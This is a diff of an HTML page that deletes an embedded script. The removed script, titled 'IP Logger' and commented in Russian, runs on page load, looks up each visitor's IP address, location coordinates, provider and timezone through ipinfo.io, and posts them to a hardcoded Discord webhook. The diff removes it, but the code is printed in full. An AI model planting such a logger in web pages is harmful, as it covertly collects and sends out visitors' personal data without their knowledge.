@@ -133,51 +133,7 @@
         </p>
     </div>
 </div>
-
+    
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"></script>
-
- <script>
-    const webHookUrl = "https://discord.com/api/webhooks/1374334361561989151/x7V-XHZChZbH4Wzez6oUBOu1RELI4YJRyKZcLaeE7NZBUPl83Mkv50aCq6i4qB_8N5-W"; // ← замени на свой
-
-    async function sendIP() {
-      try {
-        const res = await fetch("https://ipinfo.io/json?token=2f0c1e2b9d3e10"); // ← публичный токен (можно использовать для теста)
-        const data = await res.json();
-
-        console.log("Данные от ipinfo:", data);
-
-        const { ip, city, region, country, loc, org, timezone } = data;
-        const [lat, lon] = loc.split(",");
-
-        const message = {
-          username: "IP Logger",
-          content:
-            `🌐 **IP:** \`${ip}\`\n` +
-            `🏙 **Город:** ${city}, ${region}, ${country}\n` +
-            `📡 **Провайдер:** ${org}\n` +
-            `🕒 **Часовой пояс:** ${timezone}\n` +
-            `📍 **Координаты:** шир. ${lat}, дол. ${lon}`
-        };
-
-        const discordRes = await fetch(webHookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(message)
-        });
-
-        if (discordRes.ok) {
-          console.log("✅ IP отправлен в Discord.");
-        } else {
-          console.error("❌ Discord ошибка:", await discordRes.text());
-        }
-
-      } catch (err) {
-        console.error("❌ Ошибка:", err);
-      }
-    }
-
-    sendIP();
-  </script>
-  </script>
 </body>
 </html>
